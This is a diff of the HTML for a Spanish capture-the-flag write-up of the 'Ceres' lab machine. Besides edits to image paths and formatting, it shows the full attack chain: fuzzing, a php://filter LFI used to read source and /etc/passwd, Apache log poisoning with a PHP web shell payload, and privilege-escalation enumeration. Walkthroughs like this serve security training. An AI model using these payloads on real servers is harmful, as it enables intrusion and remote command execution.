@@ -194,7 +194,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 (Debian)
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><h3 id="http">HTTP</h3>
-<p><img src="/../machines/nyx/nyx_ceres/http.webp" alt="http.png"></p>
+<p><img src="/../machines/nyx/ceres/http.webp" alt="http.png"></p>
 <p>Realizo una búsqueda de extensiones y encuentro dos ficheros.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hw=7 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt &#34;http://192.168.1.15/FUZZ.FUZ2Z/&#34;
 </span></span><span style="display:flex;"><span>********************************************************
@@ -213,20 +213,20 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><blockquote>
 <p>El archivo file no se puede ver nada y el archivo secret veo que es la salida del comando id.</p>
 </blockquote>
-<p>Esta parte de la máquina se puede complicar porque si intentas fuzzear extensiones o parámetros no encontrarás nada, pero el archivo <code>secret</code> tiene ese nombre por algo y el archivo <code>file</code> también tiene ese nombre por algo.</p>
-<p><img src="/../machines/nyx/nyx_ceres/secret.webp" alt="secret"></p>
+<p>Esta parte de la máquina se puede complicar porque si intentas fuzzear extensiones o parámetros no encontrarás nada, pero el archivo <strong>secret</strong> tiene ese nombre por algo y el archivo <strong>file</strong> también tiene ese nombre por algo.</p>
+<p><img src="/../machines/nyx/ceres/secret.webp" alt="secret"></p>
 <blockquote>
-<p>Si usamos un wrapper sobre el fichero secrets nos devolverá una string en base64, pero hay un pequeño detalle al usar el wrapper, el detalle es que al escribir <code>secret.php</code> hay que ponerlo sin la extensión php para que el wrapper funcione sino quitamos la extensión el wrapper no funcionará. Eso ocurre porque el archivo file hace un include de <code>.php</code> sería como poner <code>secret.php.php</code> pero si quitamos el <code>.php</code> y ponemos sólo secret  el resultado final será <code>secret.php</code>.</p>
+<p>Si usamos un wrapper sobre el fichero secrets nos devolverá una string en base64, pero hay un pequeño detalle al usar el wrapper, el detalle es que al escribir <strong>secret.php</strong> hay que ponerlo sin la extensión php para que el wrapper funcione sino quitamos la extensión el wrapper no funcionará. Eso ocurre porque el archivo file hace un include de <strong>.php</strong> sería como poner <strong>secret.php.php</strong> pero si quitamos el <strong>.php</strong> y ponemos sólo secret  el resultado final será <strong>secret.php</strong>.</p>
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>❯ curl -s &#34;http://192.168.1.15/file.php?file=php://filter/convert.base64-encode/resource=secret&#34;;echo
 </span></span><span style="display:flex;"><span>PD9waHAKICAgIHN5c3RlbSgiaWQiKTsgLy8gICAgICAgICAgICAgICAgICAvTXlfSDFkZDNuX1MzY3IzdAo/Pgo=
-</span></span></code></pre></div><p>Al decodear la string obtengo el directorio <code>/My_H1dd3n_S3cr3t</code>.</p>
+</span></span></code></pre></div><p>Al decodear la string obtengo el directorio <strong>/My_H1dd3n_S3cr3t</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ echo &#34;PD9waHAKICAgIHN5c3RlbSgiaWQiKTsgLy8gICAgICAgICAgICAgICAgICAvTXlfSDFkZDNuX1MzY3IzdAo/Pgo=&#34; | base64 -d
 </span></span><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>    system(&#34;id&#34;); //                  /My_H1dd3n_S3cr3t
 </span></span><span style="display:flex;"><span>?&gt;
-</span></span></code></pre></div><p>Vuelvo a fuzzear por extensiones en el nuevo directorio y encuentro otro archivo <code>file.php</code>.</p>
+</span></span></code></pre></div><p>Vuelvo a fuzzear por extensiones en el nuevo directorio y encuentro otro archivo <strong>file.php</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hl=9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt &#34;http://192.168.1.15/My_H1dd3n_S3cr3t/FUZZ.FUZ2Z/&#34;
 </span></span><span style="display:flex;"><span>********************************************************
 </span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -241,7 +241,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>000001517:   200        0 L      0 W        0 Ch        &#34;file - php&#34;
 </span></span></code></pre></div><p>Aplicando el mismo parametro anterior puedo ver el fichero passwd mediante un LFI.
-<img src="/../machines/nyx/nyx_ceres/etcpass.webp" alt="etcpass.png"></p>
+<img src="/../machines/nyx/ceres/etcpass.webp" alt="etcpass.png"></p>
 <p>Busco archivos que puedo leer mediante el LFI y encuentro un log de apache.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hl=0,26 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt &#34;http://192.168.1.15/My_H1dd3n_S3cr3t/file.php?file=FUZZ&#34;
 </span></span><span style="display:flex;"><span>********************************************************
@@ -257,16 +257,16 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>                                
 </span></span><span style="display:flex;"><span>000000643:   200        2509 L   30232 W    386284 Ch   &#34;/var/log/apache2/access.log&#34;
 </span></span></code></pre></div><p>Al poder leer el acces.log puedo realizar un log poisoning para acceder al sistema.</p>
-<p><img src="/../machines/nyx/nyx_ceres/acceslog.webp" alt="acceslog"></p>
+<p><img src="/../machines/nyx/ceres/acceslog.webp" alt="acceslog"></p>
 <p>Capturo la petición con burpsuite.</p>
-<p><img src="/../machines/nyx/nyx_ceres/burp1.webp" alt="burp1"></p>
+<p><img src="/../machines/nyx/ceres/burp1.webp" alt="burp1"></p>
 <p>La modifico y la reenvio con el user agent modificado.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
-</span></span></code></pre></div><p><img src="/../machines/nyx/nyx_ceres/burp2.webp" alt="burp2"></p>
+</span></span></code></pre></div><p><img src="/../machines/nyx/ceres/burp2.webp" alt="burp2"></p>
 <p>Verifico que puedo ejecutar comandos.</p>
-<p><img src="/../machines/nyx/nyx_ceres/acceslogcmdid.webp" alt="acceslogcmdid"></p>
+<p><img src="/../machines/nyx/ceres/acceslogcmdid.webp" alt="acceslogcmdid"></p>
 <p>Uso netcat para obtener una shell.
-<img src="/../machines/nyx/nyx_ceres/reverseshell.webp" alt="reverseshell"></p>
+<img src="/../machines/nyx/ceres/reverseshell.webp" alt="reverseshell"></p>
 <p>Enumerando permisos de sudo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@ceres:/var/www/html$ sudo -l
 </span></span><span style="display:flex;"><span>sudo -l
@@ -282,10 +282,11 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>uid=1000(giuseppe) gid=1000(giuseppe) groups=1000(giuseppe)
 </span></span></code></pre></div><p>Con pspy64 encuentro una tarea que me llama la atención.</p>
-<p><img src="/../machines/nyx/nyx_ceres/pspy64.webp" alt="pspy64"></p>
+<p><img src="/../machines/nyx/ceres/pspy64.webp" alt="pspy64"></p>
 <p>El archivo <code>important.py</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;/usr/bin/id &gt; /opt/id&#39;</span>)
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;/usr/bin/sleep 15&#39;</span>)
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;/usr/bin/rm /opt/id&#39;</span>)
